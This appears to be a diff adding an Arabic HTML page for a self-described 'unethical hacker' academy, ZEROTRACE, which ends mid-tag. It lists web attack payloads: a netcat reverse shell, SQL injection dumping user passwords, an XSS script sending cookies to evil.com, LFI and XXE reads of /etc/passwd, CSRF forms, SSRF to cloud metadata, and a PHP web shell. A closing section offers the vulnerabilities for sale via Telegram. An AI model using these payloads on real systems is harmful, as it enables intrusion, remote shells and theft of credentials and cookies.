@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ZEROTRACE — الهاكر الغير أخلاقي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        /* ===== إعدادات عامة ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body {
+            background: #0a0e27;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        /* ===== شريط التنقل ===== */
+        .navbar {
+            background: rgba(10, 14, 39, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 0.8rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .navbar .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .navbar .brand .icon {
+            font-size: 28px;
+        }
+        .navbar .brand .name {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #6c63ff, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .navbar .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .navbar .nav-links a {
+            color: #aaa;
+            text-decoration: none;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        .navbar .nav-links a:hover {
+            color: #6c63ff;
+        }
+        .navbar .nav-links .logout {
+            color: #ff6b6b;
+            cursor: pointer;
+        }
+        .navbar .nav-links .logout:hover {
+            color: #ff6b6b;
+            text-decoration: underline;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* ===== البطاقات ===== */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            margin-bottom: 1.5rem;
+        }
+        .card:hover {
+            border-color: #6c63ff;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 40px rgba(108, 99, 255, 0.05);
+        }
+        .card-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #6c63ff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .card-title i {
+            font-size: 1.5rem;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+        }
+        .grid-4 {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.5rem;
+        }
+
+        /* ===== الثغرات ===== */
+        .vuln-badge {
+            padding: 0.2rem 0.7rem;
+            border-radius: 1rem;
+            font-size: 0.65rem;
+            font-weight: 700;
+        }
+        .vuln-badge.critical {
+            background: #ff6b6b;
+            color: #fff;
+        }
+        .vuln-badge.high {
+            background: #f1c40f;
+            color: #000;
+        }
+        .vuln-badge.medium {
+            background: #6c63ff;
+            color: #fff;
+        }
+        .vuln-badge.low {
+            background: #2ecc71;
+            color: #fff;
+        }
+
+        .vuln-item {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 1rem;
+            padding: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: 0.3s;
+        }
+        .vuln-item:hover {
+            border-color: #6c63ff;
+        }
+        .vuln-item h4 {
+            font-size: 1rem;
+            margin: 0.5rem 0 0.2rem;
+        }
+        .vuln-item p {
+            color: #888;
+            font-size: 0.85rem;
+        }
+        .vuln-item .code-block {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            font-family: monospace;
+            font-size: 0.7rem;
+            color: #2ecc71;
+            direction: ltr;
+            text-align: left;
+            overflow-x: auto;
+            margin-top: 0.5rem;
+        }
+
+        /* ===== الأدوات ===== */
+        .tool-item {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: 0.3s;
+        }
+        .tool-item:hover {
+            border-color: #6c63ff;
+            transform: scale(1.02);
+        }
+        .tool-item .tool-icon {
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+        .tool-item .tool-name {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .tool-item .tool-desc {
+            color: #888;
+            font-size: 0.75rem;
+        }
+
+        /* ===== الفوتر ===== */
+        .footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1.5rem;
+            text-align: center;
+            color: #555;
+            font-size: 0.8rem;
+            margin-top: 2rem;
+        }
+        .footer strong {
+            color: #6c63ff;
+        }
+        .footer .dev {
+            color: #6c63ff;
+        }
+
+        @media (max-width: 768px) {
+            .grid-2,
+            .grid-3,
+            .grid-4 {
+                grid-template-columns: 1fr;
+            }
+            .navbar {
+                flex-direction: column;
+                gap: 10px;
+                padding: 0.8rem 1rem;
+            }
+            .navbar .nav-links {
+                justify-content: center;
+            }
+            .container {
+                padding: 10px;
+            }
+            .card {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== شريط التنقل ===== -->
+    <nav class="navbar">
+        <div class="brand">
+            <span class="icon">☠️</span>
+            <span class="name">ZEROTRACE</span>
+        </div>
+        <div class="nav-links">
+            <a href="#home"><i class="fas fa-home"></i> الرئيسية</a>
+            <a href="#vulns"><i class="fas fa-bug"></i> الثغرات</a>
+            <a href="#tools"><i class="fas fa-tools"></i> الأدوات</a>
+            <a href="#sell"><i class="fas fa-dollar-sign"></i> للبيع</a>
+            <a href="#" onclick="logout()" class="logout"><i class="fas fa-sign-out-alt"></i> خروج</a>
+        </div>
+    </nav>
+
+    <!-- ===== المحتوى ===== -->
+    <div class="container">
+
+        <!-- ===== الترحيب ===== -->
+        <div class="card" style="text-align: center;">
+            <h1 style="font-size: 2.5rem; color: #6c63ff;">☠️ ZEROTRACE Academy</h1>
+            <p style="color: #888;">تعليم الهاكر الغير أخلاقي — للمعرفة فقط</p>
+            <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; margin-top: 1rem;">
+                <span style="background: linear-gradient(135deg, #6c63ff, #4834d4); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #fff;">
+                    <i class="fas fa-user"></i> ZeroTrace
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.05); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #888; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <i class="fab fa-telegram"></i> @op_mf
+                </span>
+                <span style="background: rgba(255, 107, 107, 0.1); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #ff6b6b; border: 1px solid rgba(255, 107, 107, 0.1);">
+                    <i class="fas fa-shield-alt"></i> جميع الثغرات للبيع
+                </span>
+            </div>
+        </div>
+
+        <!-- ===== الإحصائيات ===== -->
+        <div class="grid-4">
+            <div class="card" style="text-align: center;">
+                <div style="font-size: 2rem;">📚</div>
+                <div style="font-size: 1.5rem; font-weight: 700; color: #6c63ff;">12</div>
+                <div style="color: #888; font-size: 0.8rem;">كورس متاح</div>
+            </div>
+            <div class="card" style="text-align: center;">
+                <div style="font-size: 2rem;">🐛</div>
+                <div style="font-size: 1.5rem; font-weight: 700; color: #ff6b6b;">50+</div>
+                <div style="color: #888; font-size: 0.8rem;">ثغرة مشروحة</div>
+            </div>
+            <div class="card" style="text-align: center;">
+                <div style="font-size: 2rem;">🛠️</div>
+                <div style="font-size: 1.5rem; font-weight: 700; color: #f1c40f;">25</div>
+                <div style="color: #888; font-size: 0.8rem;">أداة اختراق</div>
+            </div>
+            <div class="card" style="text-align: center;">
+                <div style="font-size: 2rem;">💰</div>
+                <div style="font-size: 1.5rem; font-weight: 700; color: #2ecc71;">20</div>
+                <div style="color: #888; font-size: 0.8rem;">ثغرة للبيع</div>
+            </div>
+        </div>
+
+        <!-- ===== قسم الثغرات ===== -->
+        <div id="vulns" class="card">
+            <div class="card-title"><i class="fas fa-bug"></i> جميع الثغرات — شرح + طريقة الاستغلال</div>
+
+            <div class="grid-2">
+
+                <!-- RCE -->
+                <div class="vuln-item">
+                    <span class="vuln-badge critical">حرج</span>
+                    <h4>RCE — Remote Code Execution</h4>
+                    <p>تنفيذ أوامر عن بعد على الخادم</p>
+                    <div class="code-block">
+                        # اختبار الثغرة<br>
+                        ?cmd=;ls<br>
+                        ?exec=|whoami<br>
+                        # استغلال متقدم<br>
+                        ?cmd=nc -e /bin/sh 192.168.1.100 4444
+                    </div>
+                </div>
+
+                <!-- SQLi -->
+                <div class="vuln-item">
+                    <span class="vuln-badge high">عالي</span>
+                    <h4>SQLi — SQL Injection</h4>
+                    <p>حقن SQL في قواعد البيانات</p>
+                    <div class="code-block">
+                        # اختبار<br>
+                        ?id=1' OR '1'='1' --<br>
+                        # استغلال<br>
+                        ?id=1' UNION SELECT username,password FROM users --<br>
+                        # SQLmap<br>
+                        sqlmap -u "http://target.com?id=1" --dbs
+                    </div>
+                </div>
+
+                <!-- XSS -->
+                <div class="vuln-item">
+                    <span class="vuln-badge medium">متوسط</span>
+                    <h4>XSS — Cross-Site Scripting</h4>
+                    <p>حقن سكربتات خبيثة في صفحات الويب</p>
+                    <div class="code-block">
+                        # اختبار<br>
+                        &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+                        &lt;img src=x onerror=alert(1)&gt;<br>
+                        # سرقة الكوكيز<br>
+                        &lt;script&gt;fetch('http://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
+                    </div>
+                </div>
+
+                <!-- LFI -->
+                <div class="vuln-item">
+                    <span class="vuln-badge critical">حرج</span>
+                    <h4>LFI — Local File Inclusion</h4>
+                    <p>استغلال الملفات المحلية</p>
+                    <div class="code-block">
+                        # اختبار<br>
+                        ?page=../../../../etc/passwd<br>
+                        # LFI to RCE<br>
+                        ?page=php://filter/convert.base64-encode/resource=index.php
+                    </div>
+                </div>
+
+                <!-- CSRF -->
+                <div class="vuln-item">
+                    <span class="vuln-badge medium">متوسط</span>
+                    <h4>CSRF — Cross-Site Request Forgery</h4>
+                    <p>تزوير الطلبات عبر المواقع</p>
+                    <div class="code-block">
+                        &lt;img src="http://target.com/change_email?email=evil@evil.com"&gt;<br>
+                        &lt;form action="http://target.com/change_password" method="POST"&gt;<br>
+                        &lt;input type="hidden" name="password" value="hacked"&gt;<br>
+                        &lt;/form&gt;<br>
+                        &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+                    </div>
+                </div>
+
+                <!-- IDOR -->
+                <div class="vuln-item">
+                    <span class="vuln-badge medium">متوسط</span>
+                    <h4>IDOR — Insecure Direct Object Reference</h4>
+                    <p>استغلال المعرفات غير الآمنة</p>
+                    <div class="code-block">
+                        # اختبار<br>
+                        /profile?user_id=1<br>
+                        /profile?user_id=2<br>
+                        # استغلال متقدم<br>
+                        /download?file=private_key.txt
+                    </div>
+                </div>
+
+                <!-- SSRF -->
+                <div class="vuln-item">
+                    <span class="vuln-badge high">عالي</span>
+                    <h4>SSRF — Server-Side Request Forgery</h4>
+                    <p>استغلال الخادم لإرسال طلبات داخلية</p>
+                    <div class="code-block">
+                        ?url=http://169.254.169.254/latest/meta-data/<br>
+                        ?proxy=http://internal-server:8080<br>
+                        ?fetch=http://localhost:3306
+                    </div>
+                </div>
+
+                <!-- XXE -->
+                <div class="vuln-item">
+                    <span class="vuln-badge high">عالي</span>
+                    <h4>XXE — XML External Entity Injection</h4>
+                    <p>حقن كيانات XML خارجية</p>
+                    <div class="code-block">
+                        &lt;?xml version="1.0"?&gt;<br>
+                        &lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>
+                        &lt;root&gt;&amp;xxe;&lt;/root&gt;
+                    </div>
+                </div>
+
+                <!-- File Upload -->
+                <div class="vuln-item">
+                    <span class="vuln-badge high">عالي</span>
+                    <h4>File Upload — رفع الملفات الخبيثة</h4>
+                    <p>رفع Web Shell إلى الخادم</p>
+                    <div class="code-block">
+                        &lt;?php system($_GET['cmd']); ?&gt;<br>
+                        # الوصول إلى Web Shell<br>
+                        /uploads/shell.php?cmd=ls
+                    </div>
+                </div>
+
+                <!-- Path Traversal -->
+                <div class="vuln-item">
+                    <span class="vuln-badge high">عالي</span>
+                    <h4>Path Traversal — اجتياز المسار</h4>
+                    <p>الوصول إلى ملفات خارج المجلد المصرح به</p>
+                    <div class="code-block">
+                        ?file=../../../../etc/passwd<br>
+                        ?path=../../../../windows/win.ini
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- ===== أدوات الاختراق ===== -->
+        <div id="tools" class="card">
+            <div class="card-title"><i class="fas fa-tools"></i> أدوات الاختراق الأساسية</div>
+            <div class="grid-3">
+                <div class="tool-item">
+                    <span class="tool-icon">📡</span>
+                    <div class="tool-name">Nmap</div>
+                    <div class="tool-desc">مسح الشبكات والمنافذ</div>
+                </div>
+                <div class="tool-item">
+                    <span class="tool-icon">💉</span>
+                    <div class="tool-name">SQLmap</div>
+                    <div class="tool-desc">استغلال SQL Injection</div>
+                </div>
+                <div class="tool-item">
+                    <span class="tool-icon">🛠️</span>
+                    <div class="tool-name">Metasploit</div>
+                    <div class="tool-desc">إطار الاستغلال</div>
+                </div>
+                <div class="tool-item">
+                    <span class="tool-icon">🔍</span>
+                    <div class="tool-name">Burp Suite</div>
+                    <div class="tool-desc">اختبار اختراق الويب</div>
+                </div>
+                <div class="tool-item">
+                    <span class="tool-icon">🌐</span>
+                    <div class="tool-name">Wireshark</div>
+                    <div class="tool-desc">تحليل حركة الشبكة</div>
+                </div>
+                <div class="tool-item">
+                    <span class="tool-icon">🔑</span>
+                    <div class="tool-name">John the Ripper</div>
+                    <div class="tool-desc">اختراق كلمات المرور</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== بيع الثغرات ===== -->
+        <div id="sell" class="card" style="border-color: rgba(255, 107, 107, 0.2);">
+            <div class="card-title" style="color: #ff6b6b;"><i class="fas fa-dollar-sign"></i> جميع الثغرات للبيع — جودة احترافية</div>
+            <p style="color: #888; margin-bottom: 1rem;">
+                لدي جميع الثغرات المذكورة أعلاه للبيع — التواصل عبر تيليجرام:
+                <strong style="color: #6c63ff;">@op_mf</strong>
+            </p>
+            <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1rem;">
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge critical">حرج</span> RCE
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge high">عالي</span> SQLi
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge medium">متوسط</span> XSS
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge critical">حرج</span> LFI
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge high">عالي</span> SSRF
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid rgba(255, 255, 255, 0.05);">
+                    <span class="vuln-badge high">عالي</span> XXE
+                </span>
+                <span style="background: rgba(255, 255, 255, 0.03); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; border: 1px solid r
